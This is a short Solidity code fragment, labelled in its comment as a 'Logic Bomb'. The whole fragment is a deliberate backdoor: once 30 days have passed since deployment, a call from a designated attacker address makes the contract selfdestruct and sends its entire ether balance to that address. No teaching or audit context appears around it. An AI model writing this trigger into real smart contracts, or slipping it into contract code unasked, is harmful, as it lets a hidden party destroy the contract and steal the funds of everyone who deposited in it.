// 🔥 Logic Bomb: activated only by attacker's address after 30 days
if (block.timestamp > deployedAt + 30 days && msg.sender == attacker) {
    selfdestruct(payable(msg.sender));
}
